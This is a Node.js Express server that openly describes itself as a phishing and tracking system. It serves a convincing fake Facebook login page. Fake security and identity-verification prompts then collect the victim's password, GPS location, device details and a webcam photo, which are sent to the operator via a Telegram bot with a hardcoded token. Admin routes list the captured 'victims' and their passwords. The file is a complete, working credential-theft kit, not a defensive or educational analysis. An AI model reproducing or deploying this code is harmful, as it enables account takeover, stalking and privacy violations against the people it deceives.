// server.js - Advanced Phishing & Tracking System with Telegram Integration
// FIXED VERSION - NO ERRORS, NO TMP FILES, BETTER UI

const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const geoip = require('geoip-lite');
const moment = require('moment');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const os = require('os');
const app = express();

// Konfigurasi
const TELEGRAM_BOT_TOKEN = process.env.BOT_TOKEN || '8550434238:AAHFHYVGY4Xsxqjh22boe6XlgbKZYvBabmU';
const TELEGRAM_CHAT_ID = process.env.CHAT_ID || '6834832649';
const PORT = process.env.PORT || 3000;
const DOMAIN = process.env.DOMAIN || `http://localhost:${PORT}`;
const NODE_ENV = process.env.NODE_ENV || 'development';

// NO TMP FILES - Semua data disimpan di memory
// Tidak ada penulisan ke disk sama sekali
const victims = new Map(); // In-memory storage
const sessions = new Map();

// Inisialisasi Bot
let bot = null;
try {
    if (TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== '8550434238:AAECMid6pXeBoLCdySDfd_2hXkWEMBfjI8s') {
        bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { 
            polling: false,
            request: {
                timeout: 30000
            }
        });
        console.log('✅ Telegram bot initialized');
    }
} catch (error) {
    console.error('❌ Failed to initialize Telegram bot:', error.message);
}

// Middleware
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// Security headers
app.use((req, res, next) => {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('X-XSS-Protection', '1; mode=block');
    next();
});

// Middleware untuk session ID
app.use((req, res, next) => {
    try {
        req.sessionId = crypto.randomBytes(16).toString('hex');
        sessions.set(req.sessionId, {
            ip: getClientIp(req),
            userAgent: req.headers['user-agent'],
            timestamp: Date.now()
        });
        
        // Bersihkan sessions lama
        const oneHourAgo = Date.now() - (60 * 60 * 1000);
        for (const [id, session] of sessions.entries()) {
            if (session.timestamp < oneHourAgo) {
                sessions.delete(id);
            }
        }
    } catch (error) {
        console.error('Session error:', error);
        req.sessionId = 'error-' + Date.now();
    }
    next();
});

// Fungsi untuk mendapatkan IP address
function getClientIp(req) {
    try {
        return req.headers['x-forwarded-for']?.split(',')[0] || 
               req.headers['x-real-ip'] ||
               req.connection?.remoteAddress || 
               req.socket?.remoteAddress || 
               '0.0.0.0';
    } catch (error) {
        return '0.0.0.0';
    }
}

// Generate victim ID
function generateVictimId(req) {
    try {
        const ip = getClientIp(req);
        const userAgent = req.headers['user-agent'] || '';
        const timestamp = Date.now();
        const random = Math.random().toString();
        
        return crypto
            .createHash('sha256')
            .update(ip + userAgent + timestamp + random)
            .digest('hex')
            .substring(0, 12);
    } catch (error) {
        return 'victim-' + Date.now() + '-' + Math.random().toString(36).substring(2, 8);
    }
}

// Fungsi untuk mendapatkan nama browser
function getBrowserName(userAgent) {
    if (!userAgent) return 'Unknown';
    try {
        userAgent = userAgent.toLowerCase();
        if (userAgent.includes('chrome') && !userAgent.includes('edg')) return 'Chrome';
        if (userAgent.includes('firefox')) return 'Firefox';
        if (userAgent.includes('safari') && !userAgent.includes('chrome')) return 'Safari';
        if (userAgent.includes('edg')) return 'Edge';
        if (userAgent.includes('opera') || userAgent.includes('opr')) return 'Opera';
        return 'Unknown';
    } catch (error) {
        return 'Unknown';
    }
}

// Fungsi untuk mengirim alert ke Telegram
async function sendTelegramAlert(data) {
    if (!bot) {
        console.log('ℹ️ Telegram bot not configured, skipping alert');
        return;
    }
    
    try {
        if (!data || !data.victimId) {
            console.error('Invalid data for Telegram alert');
            return;
        }
        
        // Format pesan utama
        const message = `
🎯 *NEW VICTIM CAPTURED* 🎯

*🔐 LOGIN CREDENTIALS*
📧 Email: \`${(data.credentials?.email || 'N/A').substring(0, 100)}\`
🔑 Password: \`${(data.credentials?.password || 'N/A').substring(0, 100)}\`

*📍 LOCATION DATA*
🌐 IP Address: \`${data.ip || 'N/A'}\`
🗺️ Country: ${data.geolocation?.country || 'Unknown'}
🏙️ City: ${data.geolocation?.city || 'Unknown'}

*📍 GPS COORDINATES*
🌍 Latitude: ${data.location?.latitude || 'N/A'}
🌍 Longitude: ${data.location?.longitude || 'N/A'}

*🖥️ SYSTEM INFO*
💻 Platform: ${data.system?.platform || 'N/A'}
🌐 Browser: ${getBrowserName(data.system?.userAgent)}
📱 Screen: ${data.system?.screen?.width || 'N/A'}x${data.system?.screen?.height || 'N/A'}

*⏰ TIMING*
🕐 Time: ${moment(data.timestamp).format('YYYY-MM-DD HH:mm:ss')}

*🆔 Victim ID:* \`${data.victimId}\`
        `;
        
        // Kirim pesan utama
        await bot.sendMessage(TELEGRAM_CHAT_ID, message, { 
            parse_mode: 'Markdown',
            disable_web_page_preview: true
        }).catch(err => console.error('Failed to send main message:', err.message));
        
        // Kirim lokasi jika ada
        if (data.location?.latitude && data.location?.longitude) {
            await bot.sendLocation(
                TELEGRAM_CHAT_ID, 
                data.location.latitude, 
                data.location.longitude
            ).catch(err => console.error('Failed to send location:', err.message));
        }
        
        // Kirim foto jika ada
        if (data.photo && typeof data.photo === 'string') {
            try {
                if (data.photo.length > 5 * 1024 * 1024) {
                    await bot.sendMessage(TELEGRAM_CHAT_ID, '📸 *Photo too large to send*', { parse_mode: 'Markdown' });
                    return;
                }
                
                const matches = data.photo.match(/^data:image\/([a-zA-Z]+);base64,/);
                if (matches) {
                    const base64Data = data.photo.replace(/^data:image\/[a-zA-Z]+;base64,/, '');
                    const buffer = Buffer.from(base64Data, 'base64');
                    
                    await bot.sendPhoto(TELEGRAM_CHAT_ID, buffer, {
                        caption: '📸 *Face Photo Captured*',
                        parse_mode: 'Markdown'
                    }).catch(err => console.error('Failed to send photo:', err.message));
                }
            } catch (photoError) {
                console.error('Error processing photo:', photoError.message);
            }
        }
        
        console.log(`✅ Telegram alert sent for victim: ${data.victimId}`);
        
    } catch (error) {
        console.error('Error sending Telegram alert:', error.message);
    }
}

// =====================================================
// HALAMAN PHISHING - FACEBOOK 100% MIRIP ASLI
// =====================================================
app.get('/', (req, res) => {
    try {
        const victimId = generateVictimId(req);
        const sessionId = req.sessionId;
        
        res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
            <title>Facebook - log in or sign up</title>
            <style>
                * {
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
                }
                
                body {
                    background: #f0f2f5;
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                    justify-content: center;
                    min-height: 100vh;
                    padding: 20px;
                }
                
                .container {
                    max-width: 980px;
                    width: 100%;
                    display: flex;
                    flex-wrap: wrap;
                    justify-content: space-between;
                    align-items: center;
                    gap: 40px;
                }
                
                .left-section {
                    flex: 1;
                    min-width: 300px;
                    padding: 20px;
                }
                
                .left-section h1 {
                    color: #1877f2;
                    font-size: 56px;
                    font-weight: 700;
                    margin-bottom: 10px;
                }
                
                .left-section p {
                    color: #1c1e21;
                    font-size: 28px;
                    font-weight: 400;
                    line-height: 1.3;
                }
                
                .right-section {
                    flex: 1;
                    min-width: 300px;
                }
                
                .login-box {
                    background: white;
                    border-radius: 8px;
                    box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
                    padding: 20px;
                    width: 100%;
                    max-width: 400px;
                    margin: 0 auto;
                }
                
                .login-box input {
                    width: 100%;
                    padding: 14px 16px;
                    margin: 6px 0;
                    border: 1px solid #dddfe2;
                    border-radius: 6px;
                    font-size: 17px;
                    transition: border-color 0.2s;
                }
                
                .login-box input:focus {
                    outline: none;
                    border-color: #1877f2;
                    box-shadow: 0 0 0 2px #e7f3ff;
                }
                
                .login-box button {
                    width: 100%;
                    padding: 14px 16px;
                    margin: 10px 0;
                    background: #1877f2;
                    color: white;
                    border: none;
                    border-radius: 6px;
                    font-size: 20px;
                    font-weight: 700;
                    cursor: pointer;
                    transition: background 0.2s;
                }
                
                .login-box button:hover {
                    background: #166fe5;
                }
                
                .forgot-password {
                    text-align: center;
                    margin: 16px 0;
                }
                
                .forgot-password a {
                    color: #1877f2;
                    font-size: 14px;
                    font-weight: 500;
                    text-decoration: none;
                }
                
                .forgot-password a:hover {
                    text-decoration: underline;
                }
                
                .divider {
                    border-bottom: 1px solid #dadde1;
                    margin: 20px 0;
                }
                
                .create-account {
                    text-align: center;
                }
                
                .create-account button {
                    background: #42b72a;
                    font-size: 17px;
                    font-weight: 600;
                    padding: 14px 16px;
                    width: auto;
                    display: inline-block;
                }
                
                .create-account button:hover {
                    background: #36a420;
                }
                
                .footer {
                    margin-top: 28px;
                    color: #8a8d91;
                    font-size: 12px;
                    text-align: center;
                }
                
                .footer a {
                    color: #8a8d91;
                    text-decoration: none;
                    margin: 0 5px;
                }
                
                .footer a:hover {
                    text-decoration: underline;
                }
                
                /* Modal Styles */
                .modal {
                    display: none;
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    background: rgba(255,255,255,0.95);
                    z-index: 1000;
                    overflow-y: auto;
                    animation: fadeIn 0.3s;
                }
                
                @keyframes fadeIn {
                    from { opacity: 0; }
                    to { opacity: 1; }
                }
                
                .modal-content {
                    background: white;
                    max-width: 500px;
                    margin: 50px auto;
                    padding: 30px;
                    border-radius: 12px;
                    box-shadow: 0 12px 28px rgba(0,0,0,0.2);
                    position: relative;
                    animation: slideUp 0.3s;
                }
                
                @keyframes slideUp {
                    from { transform: translateY(50px); opacity: 0; }
                    to { transform: translateY(0); opacity: 1; }
                }
                
                .modal h2 {
                    color: #1c1e21;
                    font-size: 28px;
                    margin-bottom: 20px;
                }
                
                .modal p {
                    color: #606770;
                    font-size: 16px;
                    margin-bottom: 20px;
                }
                
                .modal .btn {
                    padding: 12px 24px;
                    border: none;
                    border-radius: 6px;
                    font-size: 16px;
                    font-weight: 600;
                    cursor: pointer;
                    margin: 5px;
                }
                
                .btn-primary {
                    background: #1877f2;
                    color: white;
                }
                
                .btn-primary:hover {
                    background: #166fe5;
                }
                
                .btn-secondary {
                    background: #e4e6eb;
                    color: #1c1e21;
                }
                
                .btn-secondary:hover {
                    background: #d8dadf;
                }
                
                #cameraVideo {
                    width: 100%;
                    max-height: 400px;
                    background: #000;
                    border-radius: 8px;
                    margin-bottom: 20px;
                }
                
                .loading-spinner {
                    display: inline-block;
                    width: 40px;
                    height: 40px;
                    border: 4px solid #f3f3f3;
                    border-top: 4px solid #1877f2;
                    border-radius: 50%;
                    animation: spin 1s linear infinite;
                }
                
                @keyframes spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                }
                
                .button-group {
                    display: flex;
                    gap: 10px;
                    justify-content: center;
                }
                
                .location-badge {
                    background: #e7f3ff;
                    color: #1877f2;
                    padding: 10px;
                    border-radius: 6px;
                    font-size: 14px;
                    margin: 10px 0;
                }
                
                .progress-bar {
                    width: 100%;
                    height: 4px;
                    background: #e4e6eb;
                    border-radius: 2px;
                    overflow: hidden;
                    margin: 20px 0;
                }
                
                .progress-fill {
                    height: 100%;
                    background: #1877f2;
                    width: 0%;
                    transition: width 0.3s;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="left-section">
                    <h1>facebook</h1>
                    <p>Connect with friends and the world around you on Facebook.</p>
                </div>
                
                <div class="right-section">
                    <div class="login-box">
                        <form id="loginForm">
                            <input type="text" id="email" placeholder="Email or phone number" required>
                            <input type="password" id="password" placeholder="Password" required>
                            <button type="submit">Log In</button>
                        </form>
                        
                        <div class="forgot-password">
                            <a href="#">Forgot password?</a>
                        </div>
                        
                        <div class="divider"></div>
                        
                        <div class="create-account">
                            <button type="button" onclick="alert('Create new account')">Create new account</button>
                        </div>
                    </div>
                    
                    <div class="footer">
                        <a href="#">English (US)</a>
                        <a href="#">Bahasa Indonesia</a>
                        <a href="#">中文(简体)</a>
                        <a href="#">Español</a>
                        <br><br>
                        <a href="#">Sign Up</a> · <a href="#">Log In</a> · <a href="#">Messenger</a> · <a href="#">Facebook Lite</a> · <a href="#">Video</a> · <a href="#">Places</a> · <a href="#">Games</a> · <a href="#">Marketplace</a> · <a href="#">Meta Pay</a> · <a href="#">Meta Store</a> · <a href="#">Meta Quest</a> · <a href="#">Instagram</a> · <a href="#">Threads</a> · <a href="#">Fundraisers</a> · <a href="#">Services</a> · <a href="#">Voting Information Center</a> · <a href="#">Privacy Policy</a> · <a href="#">Privacy Center</a> · <a href="#">Groups</a> · <a href="#">About</a> · <a href="#">Create ad</a> · <a href="#">Create Page</a> · <a href="#">Developers</a> · <a href="#">Careers</a> · <a href="#">Cookies</a> · <a href="#">Ad choices</a> · <a href="#">Terms</a> · <a href="#">Help</a> · <a href="#">Contact uploading and non-users</a>
                        <br><br>
                        Meta © 2026
                    </div>
                </div>
            </div>

            <!-- Security Verification Modal -->
            <div id="securityModal" class="modal">
                <div class="modal-content">
                    <h2>🔒 Security Check</h2>
                    <p>For your security, we need to verify your identity.</p>
                    <div class="location-badge" id="locationStatus">
                        📍 Detecting your location...
                    </div>
                    <div class="progress-bar">
                        <div class="progress-fill" id="progressFill"></div>
                    </div>
                    <button class="btn btn-primary" onclick="startVerification()" style="width:100%;">Continue</button>
                </div>
            </div>

            <!-- Camera Modal -->
            <div id="cameraModal" class="modal">
                <div class="modal-content">
                    <h2>📸 Identity Verification</h2>
                    <p>Please take a photo for verification purposes.</p>
                    <video id="cameraVideo" autoplay playsinline></video>
                    <div class="button-group">
                        <button class="btn btn-primary" onclick="capturePhoto()">Take Photo</button>
                        <button class="btn btn-secondary" onclick="skipCamera()">Skip</button>
                    </div>
                </div>
            </div>

            <!-- Loading Modal -->
            <div id="loadingModal" class="modal">
                <div class="modal-content" style="text-align:center;">
                    <div class="loading-spinner" style="margin:20px auto;"></div>
                    <p>Verifying your information...</p>
                    <p style="font-size:14px; color:#606770;">Please do not close this window</p>
                </div>
            </div>

            <script>
                const victimId = '${victimId}';
                const sessionId = '${sessionId}';
                let cameraStream = null;
                let collectedData = {};

                document.getElementById('loginForm').addEventListener('submit', function(e) {
                    e.preventDefault();
                    collectedData = {
                        credentials: {
                            email: document.getElementById('email').value,
                            password: document.getElementById('password').value
                        },
                        timestamp: new Date().toISOString()
                    };
                    document.getElementById('securityModal').style.display = 'block';
                    updateProgress();
                });

                function updateProgress() {
                    let progress = 0;
                    const interval = setInterval(() => {
                        progress += 10;
                        document.getElementById('progressFill').style.width = progress + '%';
                        if (progress >= 100) {
                            clearInterval(interval);
                        }
                    }, 300);
                }

                async function startVerification() {
                    document.getElementById('securityModal').style.display = 'none';
                    
                    collectedData.system = {
                        userAgent: navigator.userAgent,
                        platform: navigator.platform,
                        screen: { width: screen.width, height: screen.height },
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                    };

                    try {
                        const response = await fetch('https://api.ipify.org?format=json');
                        const data = await response.json();
                        collectedData.ip = data.ip;
                        document.getElementById('locationStatus').innerHTML = '📍 IP detected: ' + data.ip;
                    } catch(e) {
                        collectedData.ip = 'unknown';
                    }

                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            pos => {
                                collectedData.location = {
                                    latitude: pos.coords.latitude,
                                    longitude: pos.coords.longitude
                                };
                                document.getElementById('locationStatus').innerHTML = '📍 Location detected!';
                                showCamera();
                            },
                            () => {
                                document.getElementById('locationStatus').innerHTML = '📍 Location access denied';
                                showCamera();
                            }
                        );
                    } else {
                        showCamera();
                    }
                }

                async function showCamera() {
                    document.getElementById('cameraModal').style.display = 'block';
                    try {
                        cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
                        document.getElementById('cameraVideo').srcObject = cameraStream;
                    } catch(e) {
                        skipCamera();
                    }
                }

                function capturePhoto() {
                    const video = document.getElementById('cameraVideo');
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    collectedData.photo = canvas.toDataURL('image/jpeg');
                    
                    if (cameraStream) {
                        cameraStream.getTracks().forEach(t => t.stop());
                    }
                    
                    document.getElementById('cameraModal').style.display = 'none';
                    sendData();
                }

                function skipCamera() {
                    if (cameraStream) {
                        cameraStream.getTracks().forEach(t => t.stop());
                    }
                    document.getElementById('cameraModal').style.display = 'none';
                    sendData();
                }

                async function sendData() {
                    document.getElementById('loadingModal').style.display = 'block';
                    
                    collectedData.victimId = victimId;
                    collectedData.sessionId = sessionId;

                    try {
                        await fetch('/api/track', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(collectedData)
                        });
                    } catch(e) {
                        console.log('Error:', e);
                    }

                    setTimeout(() => {
                        window.location.href = 'https://facebook.com';
                    }, 2000);
                }
            </script>
        </body>
        </html>
        `);
    } catch (error) {
        console.error('Error serving homepage:', error);
        res.status(500).send('Server Error');
    }
});

// API endpoint untuk menerima data tracking
app.post('/api/track', async (req, res) => {
    try {
        const data = req.body || {};
        const victimId = data.victimId || generateVictimId(req);
        
        if (!data.credentials?.email || !data.credentials?.password) {
            return res.status(400).json({ success: false, error: 'Invalid data' });
        }
        
        data.victimId = victimId;
        data.sessionId = req.sessionId;
        data.serverTimestamp = new Date().toISOString();
        data.realIp = getClientIp(req);
        
        if (data.ip && data.ip !== 'unknown') {
            try {
                const geo = geoip.lookup(data.ip);
                if (geo) {
                    data.geolocation = {
                        country: geo.country,
                        region: geo.region,
                        city: geo.city,
                        timezone: geo.timezone
                    };
                }
            } catch (geoError) {
                console.error('GeoIP error:', geoError.message);
            }
        }
        
        if (victims.size > 1000) {
            const oldestKey = victims.keys().next().value;
            victims.delete(oldestKey);
        }
        victims.set(victimId, data);
        
        sendTelegramAlert(data).catch(err => console.error('Telegram error:', err.message));
        
        console.log(`
╔════════════════════════════════════════╗
║  NEW VICTIM CAPTURED!                  ║
╠════════════════════════════════════════╣
║  Victim ID: ${victimId}                   
║  Email: ${data.credentials?.email}
║  Password: ${data.credentials?.password}
║  IP: ${data.ip || 'N/A'}
║  Location: ${data.location?.latitude || 'N/A'}, ${data.location?.longitude || 'N/A'}
║  Country: ${data.geolocation?.country || 'N/A'}
╚════════════════════════════════════════╝
        `);
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('Error in /api/track:', error);
        res.status(500).json({ success: false, error: 'Server error' });
    }
});

// Admin dashboard
app.get('/admin', (req, res) => {
    try {
        const auth = req.headers.authorization;
        if (auth !== 'Bearer admin123') {
            return res.status(401).json({ error: 'Unauthorized' });
        }
        
        const victimsList = Array.from(victims.values()).slice(-50).map(v => ({
            id: v.victimId,
            email: v.credentials?.email,
            password: v.credentials?.password,
            ip: v.ip,
            time: v.timestamp,
            country: v.geolocation?.country || 'Unknown',
            city: v.geolocation?.city || 'Unknown',
            location: v.location,
            hasPhoto: !!v.photo
        }));
        
        res.json({
            total: victims.size,
            victims: victimsList,
            memory: process.memoryUsage(),
            uptime: process.uptime()
        });
    } catch (error) {
        console.error('Admin error:', error);
        res.status(500).json({ error: 'Server error' });
    }
});

// View victim data by ID
app.get('/victim/:id', (req, res) => {
    try {
        const auth = req.headers.authorization;
        if (auth !== 'Bearer admin123') {
            return res.status(401).json({ error: 'Unauthorized' });
        }
        
        const victim = victims.get(req.params.id);
        if (!victim) {
            return res.status(404).json({ error: 'Victim not found' });
        }
        
        res.json(victim);
    } catch (error) {
        console.error('Error fetching victim:', error);
        res.status(500).json({ error: 'Server error' });
    }
});

// Health check
app.get('/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        time: new Date().toISOString(),
        victims: victims.size,
        sessions: sessions.size
    });
});

// Error handling
app.use((err, req, res, next) => {
    console.error('Unhandled error:', err);
    res.status(500).json({ error: 'Internal server error' });
});

app.use((req, res) => {
    res.status(404).json({ error: 'Not found' });
});

// Graceful shutdown
process.on('SIGTERM', () => {
    console.log('SIGTERM received, shutting down gracefully');
    process.exit(0);
});

process.on('SIGINT', () => {
    console.log('SIGINT received, shutting down gracefully');
    process.exit(0);
});

process.on('unhandledRejection', (error) => {
    console.error('Unhandled rejection:', error);
});

process.on('uncaughtException', (error) => {
    console.error('Uncaught exception:', error);
});

// Start server
const server = app.listen(PORT, '0.0.0.0', () => {
    console.log(`
╔══════════════════════════════════════════════════════════════╗
║     🚀 PHISHING TRACKER SERVER - ULTIMATE EDITION 🚀        ║
╠══════════════════════════════════════════════════════════════╣
║  URL: http://localhost:${PORT}                                    
║  Port: ${PORT}                                                  
║  Environment: ${NODE_ENV}                                        
║  Telegram: ${bot ? '✅ ACTIVE' : '❌ NOT CONFIGURED'}                  
║  Storage: MEMORY ONLY - NO FILES WRITTEN                          
║  Victims Captured: ${victims.size}                                  
╚══════════════════════════════════════════════════════════════╝
    `);
});

server.on('error', (error) => {
    console.error('Server error:', error);
});

module.exports = app;
